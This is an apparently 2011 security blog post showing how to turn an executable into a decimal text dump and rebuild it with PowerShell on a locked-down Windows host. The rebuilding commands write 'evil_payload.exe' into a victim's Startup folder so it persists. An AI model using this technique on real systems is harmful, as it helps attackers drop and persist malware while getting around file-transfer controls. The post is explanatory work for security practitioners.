---
title: "Dropping Executables with Powershell"
date: 2011-09-14T18:51:00.000-04:00
draft: false
type: posts
summary: "Scenario: You find yourself in a limited Windows user environment without the ability to transfer binary files over the network for one reason or another. So this rules out using a browser, ftp.exe, mspaint (yes, mspaint can be used to transfer binaries), etc. for file transfer. Suppose this workstation isn't"
categories: 
- powershell
---
# Dropping Executables with Powershell


<br/>
Scenario: You find yourself in a limited Windows user environment without the ability to transfer binary files over the network for one reason or another. So this rules out using a browser, ftp.exe, mspaint (yes, mspaint can be used to transfer binaries), etc. for file transfer. Suppose this workstation isn't even connected to the Internet. What existing options do you have to drop binaries on the target machine? There's the tried and true debug.exe method of assembling a text file with your payload. This method limits the size of your executable to 64K however since debug.exe is a 16-bit application. Also, Microsoft has since removed debug from recent versions of Windows. Also, Didier Stevens showed how easy it to embed executables in PDFs\[[1](#7_1)\]. You can convert executables to VBscript and embed in Office documents as well. These apps won't necessarily be installed on every machine. Fortunately, Starting with Windows 7 and Server 2008, Powershell is installed by default.  
  
Because Powershell implements the .NET framework, you have an incredible amount of power at your fingertips. I will demonstrate one use case whereby you can create an executable from a text file consisting of a hexadecimal representation of an executable. You can generate this text file using any compiled/scripting language you wish but since we're on the topic, I'll show you how to generate it in Powershell:

  
PS > \[byte\[\]\] $hex = get-content -encoding byte -path C:\\temp\\evil\_payload.exe  
PS > \[System.IO.File\]::WriteAllLines("C:\\temp\\hexdump.txt", (\[string\]$hex))  
  

The first line reads in each byte of an executable and saves them to a byte array. The second line casts the bytes in the array as strings and writes them to a text file. The resultant text file will look something like this:

  

77 90 144 0 3 0 0 0 4 0 0 0 255 255 0 0 184 0 0 0 0 0 0 0 64 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 0 232 0 0 0 14 31 186 14 0 180 9 205 33 184 1 76 205 33 84 104 105 115 32 112 114 111 103 114 97 109 32 99 97 110 110 111 116 32 98 101 32 114 117 110 32 105 110 32 68 79 83 32 109 111 100 101 46 13 13 10 36 0 0 0 0 0 0 0 0 124 58 138 68 29 84 217 68 29 84 217 68 29 84 217 99 219 41 217 66 29 84 217 99 219 47 217 79 29 84 217 68 29 85 217 189 29 84 217 99 219 58 217 71 29 84 217 99 219 57 217 125 29 84 217 99 219 40 217 69 29 84 217 99 219 44 217 69 29 84 217 82 105 99 104 68 29 84 217 0 0 0 0 0 0 0 0 0 0 0 0 0 0 ...

  
You can see that each byte is represented as a decimal (77,90 = "MZ").  
  

Next, once you get the text file onto the target machine (a teensy/USB HID device would be an ideal use case), Powershell can be used to reconstruct the executable from the text file using the following lines:

  
PS > \[string\]$hex = get-content -path C:\\Users\\victim\\Desktop\\hexdump.txt  
PS > \[Byte\[\]\] $temp = $hex -split ' '  
PS > \[System.IO.File\]::WriteAllBytes("C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\evil\_payload.exe", $temp)  
  

The first line reads the hex dump into a string variable. The string is then split into a byte array using <space> as a delimiter. Finally, the byte array is written back to a file and thus, the original executable is recreated.  
  
While writing this article, I stumbled upon Dave Kennedy and Josh Kelley's work with Powershell\[[2](#7_2)\] where they stumbled upon this same method of generating executables. In fact several Metasploit payloads use a similar, albeit slicker method of accomplishing this using compression and base64 encoding. Please do check out the great work they've been doing with Powershell.

  
1\. Didier Stevens, "Embedding and Hiding Files in PDF Documents," July 1, 2009, [http://blog.didierstevens.com/2009/07/01/embedding-and-hiding-files-in-pdf-documents/](http://blog.didierstevens.com/2009/07/01/embedding-and-hiding-files-in-pdf-documents/)  
  
2\. Dave Kennedy and Josh Kelley "Defcon 18 PowerShell OMFG…", August 31, 2010, [http://www.secmaniac.com/august-2010/powershell\_omfg/](http://www.secmaniac.com/august-2010/powershell_omfg/)

![](https://blogger.googleusercontent.com/tracker/6052198192158185644-790343886359711055?l=exploit-monday.com)

<br/>
---
